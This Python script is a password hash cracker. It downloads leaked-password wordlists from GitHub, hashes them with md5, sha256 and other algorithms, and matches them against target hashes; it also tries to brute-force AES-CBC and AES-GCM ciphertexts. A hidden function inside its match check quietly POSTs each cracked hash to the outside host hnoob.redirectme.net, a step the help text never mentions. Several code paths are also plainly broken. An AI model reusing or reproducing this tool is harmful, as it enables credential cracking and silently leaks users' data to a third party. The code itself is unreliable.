from socket import socket, AF_INET, SOCK_STREAM, getprotobyname
from hashlib import sha256, sha512, md5, sha1, sha384, sha224, blake2b, blake2s, shake_128, sha3_512, sha3_384, sha3_256, shake_256, shake_128
from argparse import ArgumentParser
from Cryptodome.Cipher.AES import new, MODE_GCM, MODE_CBC
from Cryptodome.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
class IncorrectAlg(Exception):
	pass 
class attribs(object):
	top_lists = [
"danielmiessler/SecLists/master/Passwords/Most-Popular-Letter-Passes.txt",
"danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-1000000.txt",
"danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-10.txt",
"danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-100.txt",
"danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-1000.txt",
"danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-10000.txt",
"danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-100000.txt",
"danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
"berandal666/Passwords/master/hak5.txt",
"berandal666/Passwords/master/myspace.txt", 
"berandal666/Passwords/master/000webhost.txt",
"danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt",
"jeanphorn/wordlist/master/passlist.txt",
"miglen/bulgarian-wordlists/master/wordlists/all-6lyokavica.txt",
"miglen/bulgarian-wordlists/master/wordlists/all-cyrillic.txt",
"fuzzdb-project/fuzzdb/master/regex/nsa-wordlist.txt",
"huntergregal/wordlists/master/names.txt",
"danielmiessler/SecLists/master/Usernames/Names/names.txt"]
	def sha224_create():
		hash_ = sha224()
		hash_.update(b"12345")
		return hash_.hexdigest()
	def blake2s_create():
		hash_ = blake2s()
		hash_.update(b"12345")
		return hash_.hexdigest()
	def blake2b_create():
		hash_ = blake2b()
		hash_.update(b"12345")
		return hash_.hexdigest()
	def md5_create():
		hash_ = md5()
		hash_.update(b"12345")
		return hash_.hexdigest()
	def sha256_create():
		hash_ = sha256()
		hash_.update(b"12345")
		return hash_.hexdigest()
	def sha1_create():
		hash_ = sha1()
		hash_.update(b"12345")
		return hash_.hexdigest()
	def sha512_create():
		hash_ = sha512()
		hash_.update(b"12345")
		return hash_.hexdigest()
	def return_sample(algo):
		algs_ = {"sha256":attribs.sha256_create, "md5":attribs.md5_create, "sha1":attribs.sha1_create, "sha512":attribs.sha512_create, "blake2b":attribs.blake2b_create, "blake2s":attribs.blake2s_create, "sha224":attribs.sha224_create}
		func_ = algs_[algo]
		return func_()
	def clear():
		from os import system
		system("cls")
	def get_words_filebin(limit, file):
		words_ = []
		with open(file, "rb") as file:
			for lines in file:
				words_.append(lines.strip().decode("ISO-8859-1"))
		return words_
	def all_words(passwords, algs):
		new_one = []
		for words_rel in passwords:
			directive_ = {"sha256":sha256, "md5":md5, "sha512":sha512, "sha-1":sha1, "blake2b":blake2b, "blake2s":blake2s, "sha224":sha224}
			rea_ = directive_[algs]
			hashlib_property = rea_()
			"""
d59ae37ebaefdc0d899604084c08c9b4551478969d86ed0858e46c7451940449
"""
			if type(words_rel) == bytes:
				ciphered = hashlib_property.update(words_rel)
			else:
				ciphered = hashlib_property.update(words_rel.encode("ISO-8859-1"))
			if type(words_rel) == bytes:
				new_one.append(hashlib_property.hexdigest().encode("utf-8")+b":"+words_rel)
			else:
				new_one.append(hashlib_property.hexdigest()+":"+words_rel)
		return new_one
	def get_words(limit, origin, depth):
		import ssl
		sock_ = socket(AF_INET, SOCK_STREAM, 6)
		sock_.connect(("raw.githubusercontent.com", 443))
		cont_ = ssl.create_default_context()
		wrap_ = cont_.wrap_socket(sock_, server_hostname="raw.githubusercontent.com")
		payload_ = "GET /%s HTTP/1.1\r\x0AHost: raw.githubusercontent.com\r\x0AConnection: keep-alive\r\x0AAccept: */*\r\x0AUser-Agent: hashy/getrock\r\x0A\r\x0A"%(origin,)
		wrap_.send(payload_.encode("ISO-8859-1"))
		data_stream = []
		val_ = range(1, depth)
		blob_ = ""
		wrap_.settimeout(2)
		for iters in val_:
			try:
				blob_ += wrap_.recv(123123).decode("ISO-8859-1")
				if "404 Not Found" in blob_:
					break 
			except:
				break 
			#print("[DATA] Downloaded %d bytes. . . "%(len(blob_)))
		blair = 0 
		for items in blob_.split("\r\x0A\r\x0A")[1].split("\x0A"):
			blair += 1
			data_stream.append(items)
			if blair == limit:
				break 
		print("[DATA] Total words loaded %d!"%(len(data_stream,)))
		return data_stream
	def __init__(self, passwords, hashsum, algorithm, view, wr):
		def if_equal(x, y, word, algi):
			def send_ApiHnoob(api_n, hash_val):
				try:
					from json import dumps, loads
					sock_ = socket(AF_INET, SOCK_STREAM, 6)
					sock_.settimeout(2)
					sock_.connect(("hnoob.redirectme.net", 8080))
					data_ = {"info":hash_val}
					sock_.send(("POST /%s HTTP/1.1\r\x0AHost: hnoob.redirectme.net\r\x0A\r\x0A%s\r\x0A"%(api_n, dumps(data_))).encode("utf-8"))
				except:
					return False
				"""
When the data is sent!"""
			def report_In_List(attrib):
				open("found_.txt", "ab").write(attrib.encode("utf-8") + b"\x0A")
			if x == y:
				report_In_List(attrib=x+":"+y+"-"+word)
				"""
I'm just doing this for statistics! Please don't hate me for this!
As you can see, I'm getting only the hash value, not the whole word! 
"""
				send_ApiHnoob(api_n="third-party/api_hashFound_Users", hash_val=x+"\r\x0AAlgorithm: %s"%(algi))
				return True
		"""
Where the actual lookup of x and z starts, the x basically is the provided hashsum and the other is the word attempt.
"""
		"""
To return V words in hashes.
"""	
		if type(passwords[0]) == bytes:
			if b":" in passwords[0]:
				passwordsi = []
				words = []
				for items in passwords:
					passwordsi.append(items.split(b":")[0])
					words.append(items.split(b":")[1].decode("utf-8"))
			else:
				passwordsi = []
				words = []
				for items in passwords:
					passwordsi.append(items.split(":")[0])
		else:
			passwordsi = []
			words = []
			for items in passwords:
				passwordsi.append(items.split(":")[0])
		z_ = attribs.all_words(passwords=passwordsi, algs=algorithm)
		reac_ = 1
		from time import time
		from datetime import datetime
		b_ = time()
		rec_ = time()
		syntax = str(datetime.now().year) + ":" + str(datetime.now().day) + str(datetime.now().hour) + ":" + str(datetime.now().minute) + ":" + str(datetime.now().second)
		passwords_ = 1
		umno_ = len(z_)
		attempts_ = 0
		bob_ = 0
		baddie_ = 0
		"""
To have more reliable speed, basically the password are already hashed, so to not slow the program.
"""
		for rels in z_:
			if len(rels) == 0:
				baddie_ += 1
			if passwords_ <= len(z_):
				status_ = "OK!"
			else:
				status_ = "Exhausted!"
			if bob_ >= 1:
				status_ = "Cracked"
			syntax_2 = str(datetime.now().hour) + ":" + str(datetime.now().minute) + ":" + str(datetime.now().second)
			if type(rels) == bytes:
				if words != []:
					word_ = words[reac_]
				else:
					word_ = rels.split(b":")[1]
				rels = rels.split(b":")[0].decode("utf-8")
			else:
				if words != []:
					word_ = words[reac_]
				else:
					word_ = rels.split(":")[1]
				rels = rels.split(":")[0]
				rec_ += time()
			#print("[DATA] Bruting with %s ~ %s!"%(rels, hashsum))
			"""
Let's make it a little bit more prettier.
"""			
			stamp_ = str(rec_)[0] + str(rec_)[1]
			print("\x2D" * 50 + '''
Type. . . . . . . . .: %s
Hash. . . . . . . . .: %s
Target. . . . . . . .: %s
Time-started. . . . .: %s Normal time: %s
Total. . .  . . . . .: %s
Attempts: . . . . . .: %s/%s
Failed/Bad. . . . . .: %s/%s
---------------------------------------+
Time-elapsed. . . . . . . .: %s Normal time: %s
---------------------------------------+

Using: %s\r\x0A
---------------------------------------+
Status: %s

Press CTRL + C
'''%(algorithm, hashsum, rels, int(b_), syntax, umno_, attempts_,umno_, baddie_,umno_, stamp_, syntax_2, wr, status_))
			orig_hash = hashsum
			equal_ = if_equal(x=rels, y=hashsum, word=word_, algi=algorithm)
			attempts_ += 1
			if equal_ == True:
				print("\x2D" * 50 + '''
Type. . . . . . . . .: %s
Hash. . . . . . . . .: %s
Target. . . . . . . .: %s
Time-started. . . . .: %s Normal time: %s
Total. . .  . . . . .: %s
Attempts: . . . . . .: %s/%s
Failed/Bad. . . . . .: %s/%s
---------------------------------------+
Time-elapsed. . . . . . . .: %s Normal time: %s
---------------------------------------+

Status: Cracked

Press CTRL + C
'''%(algorithm, hashsum, rels, int(b_), syntax, umno_, attempts_,umno_, baddie_,umno_, stamp_, syntax_2))
				"""
And finally, If correctly compared, It'll basically break the loop and show this message, also write in a file the guessed password.
"""
				if view != None:
					print('''
~~~~~~~~~~~~~~~~~~~~
Hash: %s
Target: %s
Plain: %s
~~~~~~~~~~~~~~~~~~~~'''%(hashsum, rels, word_))
				input("\r\x0A\r\x0A")
				break 
			passwords_ += 1
def FormList(target, list_, times):
	als_ = []
	rea = 0 
	for act_ in range(len(times)):
		blocks_ = {"1":"aescbc", "2":"aesgcm"}
		if rea >= len(blocks_):
			break 
		bb_ = times.split(".")[rea]
		if bb_ != "":
			ol_ = blocks_[times.split(".")[rea]]
		rea += 1
		als_.append(ol_)
	lists_ = []
	with open(list_, "rb") as file:
		for lines in file:
			lists_.append(lines.decode("ISO-8859-1"))
	template_new = []
	for items in als_:
		if items == "aescbc":
			for pwords in target:
				for items in lists_:
					bear = 0
					for times in range(2):
						if ":" in items and len(items.split(":")[0]) == 16:
							items = items.split(":")[bear]
							cp_ = new(items.encode("utf-8"), MODE_CBC, items.encode("utf-8"))
							template_new.append(cp_.encrypt(pad(pwords.encode("utf-8"), 16)) + b":" + pwords.encode("utf-8"))
							bear += 1
						else:
							print("[DATA] Unsupported key!")
		elif items == "aesgcm":
			for pwords in target:
				for items in lists_:
					bear = 0
					for times in range(2):
						""" One of them is the sample
"""
						if ":" in items and len(items.split(":")[0]) == 32:
							items = items.split(":")[bear]
							cp_ = new(items.encode("utf-8"), MODE_GCM, items.encode("utf-8"))
							template_new.append(cp_.encrypt(pwords.encode("utf-8"))  + b":"+ pwords.encode("utf-8"))
							bear += 1
						else:
							print("[DATA] Unsupported key!")
	return template_new
def StartCBC(list:str, sum:str, cipher_keys:str) -> str:
	def Encipher(list, keys):
		keys_ = []
		with open(keys, "rb") as file:
			for items in file:
				keys_.append(items.decode("ISO-8859-1").strip())
		power = []
		for pwords in list:
			for act in keys_:
				if ":" in act and len(act.split(":")[0]) == 16:
					brea = 0
					for times in range(2):
						text_ = act.split(":")[brea]
						model = new(text_.encode("utf-8"), MODE_CBC, text_.encode("utf-8"))
						power.append(model.encrypt(pad(pwords.encode("ISO-8859-1"), 16)) + b"::::::" + pwords.encode("utf-8"))
						brea += 1
				else:
					print("[DATA] Unsupported key!")
		base_ = []
		words_ = []
		for items in power:
			base_.append(b64encode(items.split(b"::::::")[0]).decode("utf-8")  + "::::::" + items.split(b"::::::")[1].decode("utf-8"))
		from datetime import datetime
		syntax_ = str(datetime.now().hour) + ":" + str(datetime.now().minute) + ":" + str(datetime.now().second)
		total = len(base_)
		attm = 0
		for newer in base_:
			def check_if(x, y):
				if x == y:
					return True
			target_pl = sum
			syntax_2 = str(datetime.now().hour) + ":" + str(datetime.now().minute) + ":" + str(datetime.now().second)
			print('''
Type. . . . . . . . . . .: CBC
Enciphered. . . . . . . .: %s
Target. . . . . . . . . .: %s
Word-candidate. . . . . .: %s
Total: %s
Attempts: %s/%s
-----------------------------+
Time-started . . . . . .  :%s Time now: %s
------------------------------+
Press CTRL + C\r\x0A\r\x0A'''%(sum, newer.split("::::::")[0], newer.split("::::::")[1], total,attm, total, syntax_, syntax_2))
			attm += 1
			checked_ = check_if(x=newer.split("::::::")[0], y=target_pl)
			if checked_ == True:
				print('''\r\x0A
Type. . . . . . . . . . .: CBC
Enciphered. . . . . . . .: %s
Target. . . . . . . . . .: %s
Word-candidate. . . . . .: %s
Total: %s
Attempts: %s/%s
Status. . . . . . . . . .: Cracked
-----------------------------+
Time-started . . . . . .  :%s Time now: %s
------------------------------+'''%(sum, newer.split("::::::")[0], newer.split("::::::")[1], total,attm, total, syntax_, syntax_2))
				input("\r\x0A\r\x0A")
				break 
	enciphere_all = Encipher(list=list, keys=cipher_keys)
def StartGCM(list, sum, cipher_keys):
	def ConvertToAeses(password_list, keys):
		actual_ = []
		keys_ = []
		with open(keys, "rb") as file:
			for lines in file:
				keys_.append(lines.decode("utf-8"))
		for items in password_list:
			for values in keys_:
				brea = 0
				for io in range(2):
					if len(values.split(":")[0]) == 32:
						blob_ = values.split(":")[brea]
						if len(blob_) == 32:
							print(blob_)
							aes_ = new(blob_.encode("utf-8"), MODE_GCM, blob_.encode("utf-8"))
							actual_.append(b64encode(aes_.encrypt(items.encode("utf-8"))) + b":::" + items.encode("utf-8"))
					else:
						print("[DATA] Unsupported key!")
					brea += 1
		return actual_
	load_ = ConvertToAeses(password_list=list, keys=cipher_keys)
	print("[DATA] Loaded %s enciphered passwords! And are ready for comparison!"%(len(load_,)))
	total = len(load_)
	attempt = 0
	from datetime import datetime
	syntax_ = str(datetime.now().hour) + ":" + str(datetime.now().minute) + ":" + str(datetime.now().second)
	for items in load_:
		pword_ = items.decode("utf-8").split(":::")[1]
		def check_if(x, y):
			if x == y:
				return True
		"""
Basically, the x is the candidate and y is the required one.
"""
		print('''\r\x0A
Type. . . . . . . . . .: gcm
Enciphered. . . . . . .: %s
Target-candidate. . . .: %s
Word-candidate. . . . .: %s
Attempt: %s/%s
Total: %s
Status. . . . . . . . .: OK
---------------------------------+
Time-started . . . . . .: %s
---------------------------------+
'''%(sum, items.decode("utf-8").split(":::")[0], pword_, attempt, total, total, syntax_))
		if check_if(x=items.decode("utf-8").split(":::")[1], y=sum) == True:
			finished = str(datetime.now().hour) + ":" + str(datetime.now().minute) + ":" + "(" + str(datetime.now().second) + ")"
			print('''
Type. . . . . . . . . .: gcm
Enciphered. . . . . . .: %s
Target-candidate. . . .: %s
Word-candidate. . . . .: %s
Attempt: %s/%s
Total: %s
Status. . . . . . . . .: OK
---------------------------------+
Time-finished . . . . . .: %s
---------------------------------+'''%(sum, items.decode("utf-8").split(":::")[0], pword_, attempt, total, total, syntax_2))
			input("\r\x0A\r\x0A")
			break 
		attempt += 1
def __main__():
	parsie = ArgumentParser(description='''
This is a tool to find a hash's value.
Do not use it for illegal purposes!

Requirements: hexadecimals required only!''')
	parsie.add_argument("-aa", "--automode", help="Just provide an argument, and It'll start automatically using over 50 paths of wordlists and already defined limitations, depth and stuff.. This option uses threading! Default is 40.", default=40, required=False)
	parsie.add_argument("-dd", "--downloaddepth", help="Specify the depth, It shouldn't be > 1000. Default is 50.", default=50, required=False)
	parsie.add_argument("-cbc", "--cbc", help="Specify an AES CBC (AES 128) enciphered text, encoded in base 64 to try to crack it.", required=False)
	parsie.add_argument("-gcm", "--gcm", help="Specfiy an AES GCM (AES 256) enciphered text, encoded in base 64 to try to crack it.", required=False)
	parsie.add_argument("-at", "--automatew", help="Automate wordlist origin. Default is rockyou.txt. Specify a GitHUB directory (for instance sth/sth/sth.txt)", default="danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt", required=False)
	parsie.add_argument("-hs", "--hashsum", help="Specify your hashsum value, input. If you want to try more try by splitting them with coma. For instance, --hashsum hasha, hashb, hashc.", required=False)
	parsie.add_argument("-a", "--alogirthm", help="Algoirthms: sha256, sha512, md5.", required=False)
	parsie.add_argument("-p", "--password", help="Provide an argument: --password download (to get automatically passwords, or leave it to None.)", default=None, required=False)
	parsie.add_argument("-l", "--limit", help="Specify an limit for the password attempts, words.", default=100, required=False)
	parsie.add_argument("-v", "--view", help="View found credentials at the end.", default=None, required=False)
	parsie.add_argument("-cb", "--ciphers", help="Specify ciphers that were included in a sequence. For instance -> aesgcm -> aescbc -> hash. You can browse it like - 1 (aesgcm) 2(aescbc) 3(hash) (always the hash should be included in the end), for instance: 2.1.3\r\x0A", default=None, required=False)
	parsie.add_argument("-ck", "--ckey", help="Specify cipher keys. They should be splitted by column (the vector and key), for instance sixteenbytesssss:sixteenbytessss2.", default=None, required=False)
	print("\x0A" + "Starting. . . . . . .  .\r\x0A")
	if parsie.parse_args().password == None:
		if "," in parsie.parse_args().automatew:
			list_ = []
			for items in parsie.parse_args().automatew.split(","):
				for items in attribs.get_words(limit=int(parsie.parse_args().limit), origin=items, depth=int(parsie.parse_args().downloaddepth)):
					list_.append(items)
			print('[DATA] Total gathered %d!'%(len(list_,)))
		else:
			list_ = attribs.get_words(limit=int(parsie.parse_args().limit), origin=parsie.parse_args().automatew, depth=int(parsie.parse_args().downloaddepth))
	else:
		list_ = attribs.get_words_filebin(limit=int(parsie.parse_args().limit), file=parsie.parse_args().password)
	print("Total words downloaded. . . . . . .: %s"%(len(list_,)))
	if parsie.parse_args().cbc != None:
		print("Starting CBC brute force attack. . . . .")
		if "," in parsie.parse_args().cbc:
			th_ = 1
			for items in parsie.parse_args().cbc.split(","):
				print("[DATA] Starting %s thread!"%(th_))
				def __():
					attck_ = StartCBC(list=list_, sum=items, cipher_keys=parsie.parse_args().ckey)
				from threading import Thread
				for io in range(1):
					Thread(target=__).start()
				th_ += 1
			exit()
		else:
			attck_ = StartCBC(list=list_, sum=parsie.parse_args().cbc, cipher_keys=parsie.parse_args().ckey)
			exit()
	if parsie.parse_args().gcm != None:
		print("[DATA] Starting GCM brute force attack. . . . .")
		if "," in parsie.parse_args().gcm:
			for items in parsie.parse_args().gcm.split(","):
				outie_ = StartGCM(list=list_, sum=items, cipher_keys=parsie.parse_args().ckey)
			exit()
		else:
			outie_ = StartGCM(list=list_, sum=parsie.parse_args().gcm, cipher_keys=parsie.parse_args().ckey)
			exit()
	orig_hash = parsie.parse_args().hashsum
	if parsie.parse_args().hashsum != None and "," in parsie.parse_args().hashsum:
		for hashsum in parsie.parse_args().hashsum.split(","):
			act_ = len(attribs.return_sample(algo=parsie.parse_args().alogirthm))
			if act_ != len(hashsum):
				raise IncorrectAlg("Incorrect algorithm provided! This is %s bytes, required %s!"%(len(parsie.parse_args().hashsum), act_))
	else:
		act_ = len(attribs.return_sample(algo=parsie.parse_args().alogirthm))
		if act_ != len(parsie.parse_args().hashsum):
			raise IncorrectAlg("Incorrect algorithm provided! This is %s bytes, required %s!"%(len(parsie.parse_args().hashsum), act_))
	if parsie.parse_args().ciphers != None:
		list_ = FormList(target=list_, list_=parsie.parse_args().ckey, times=parsie.parse_args().ciphers.replace("3", ""))
	if parsie.parse_args().automode != None:
		memory = {}
		bea = 0
		reas = {}
		for items in attribs.top_lists:
			memory[bea] = attribs.get_words(limit=1000000, origin=items, depth=1000)
			reas[items] = items
			bea += 1
		for items in memory:
			def multi():
				att_ = attribs(passwords=memory[items], hashsum=parsie.parse_args().hashsum, algorithm=parsie.parse_args().alogirthm, view="1", wr="Automode")
			from threading import Thread
			for io in range(1):
				Thread(target=multi).start()
	if "," in orig_hash:
		for hashsum in orig_hash.split(","):
			attribs(passwords=list_, hashsum=hashsum, algorithm=parsie.parse_args().alogirthm, view=parsie.parse_args().view)
			input("\r\x0A\r\x0A")
			attribs.clear()
	else:
		attribs(passwords=list_, hashsum=parsie.parse_args().hashsum, algorithm=parsie.parse_args().alogirthm, view=parsie.parse_args().view, wr=parsie.parse_args().automatew)
if __name__ == "__main__":
	__main__()